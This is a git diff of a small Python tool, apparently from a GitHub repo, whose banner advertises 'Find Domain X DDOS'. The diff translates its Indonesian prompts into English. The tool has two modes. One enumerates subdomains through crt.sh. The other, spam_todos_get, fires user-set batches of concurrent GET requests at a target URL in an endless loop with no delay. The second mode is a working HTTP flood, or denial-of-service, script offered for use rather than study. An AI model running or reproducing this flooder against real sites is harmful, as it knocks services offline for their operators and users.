@@ -4,7 +4,6 @@ import os
 import sys
 from urllib.parse import urljoin
 
-# Fungsi untuk menampilkan banner
 def display_banner():
     print("""
 #####    #######  ##   ##   #####   ##   ##  #######  ######   
@@ -16,13 +15,13 @@ def display_banner():
 #####    #######    ###     #####     ###    #######  #### ##   V1.0
 
  \033[1;32m+ -- -- +=[ Author: kdandy | Repo: https://github.com/kdandy/devtools\033[1;m
- \033[1;32m+ -- -- +=[ Find Domain X DDoS \033[1;mdev >
+ \033[1;32m+ -- -- +=[ Find Domain X DDOS \033[1;m >
     """)
 
 def display_menu():
-    print("\nPilih fitur yang ingin dijalankan:")
-    print("1. Cari subdomain menggunakan crt.sh")
-    print("2. Spam permintaan GET ke URL target")
+    print("\nSelect the features you want to run:")
+    print("1. Search for subdomains using crt.sh")
+    print("2. Spam access requests to target URLs")
     choice = input("Masukkan pilihan (1/2): ")
     return choice
 
@@ -33,12 +32,12 @@ async def fetch_subdomains(domain):
             async with session.get(crt_sh_url) as response:
                 if response.status == 200:
                     data = await response.json()
-                    subdomains = {entry['name_value'] for entry in data}  # Menggunakan set untuk menghapus duplikat
-                    print("\nSubdomain yang ditemukan:")
+                    subdomains = {entry['name_value'] for entry in data}
+                    print("\nFound subdomains:")
                     for subdomain in subdomains:
                         print(subdomain)
                 else:
-                    print(f"Gagal mengakses crt.sh. Status code: {response.status}")
+                    print(f"Failed to access crt.sh. Status code: {response.status}")
         except Exception as e:
             print(f"Terjadi error: {e}")
 
@@ -46,7 +45,7 @@ async def send_todo_get(session, url):
     try:
         async with session.get(url) as response:
             if response.status == 200:
-                print(f"sukses akses link: {url}")
+                print(f"Successful Link Access: {url}")
             else:
                 print(f"Failed to access link. Status code: {response.status}")
     except aiohttp.ClientError:
@@ -59,23 +58,23 @@ async def spam_todos_get(url, requests_per_batch):
         while True:
             tasks = [send_todo_get(session, url) for _ in range(requests_per_batch)]
             await asyncio.gather(*tasks)
-            await asyncio.sleep(0)  # Adjust delay as needed
+            await asyncio.sleep(0)
 
 async def main():
     display_banner()
     choice = display_menu()
 
     if choice == "1":
-        domain = input("Masukkan target domain (misalnya example.com): ")
+        domain = input("Enter the target domain (for example example.com): ")
         await fetch_subdomains(domain)
     elif choice == "2":
-        url = input("Masukkan URL target: ")
-        requests_per_batch = int(input("Masukkan jumlah permintaan per requests: "))
+        url = input("Enter target URL: ")
+        requests_per_batch = int(input("Enter the number of requests per requests: "))
         await spam_todos_get(url, requests_per_batch)
     else:
-        print("Pilihan tidak valid.")
+        print("Invalid selection.")
 
 try:
     asyncio.run(main())
 except KeyboardInterrupt:
-    print("Program dihentikan oleh pengguna.")
+    print("The program was terminated by the user.")
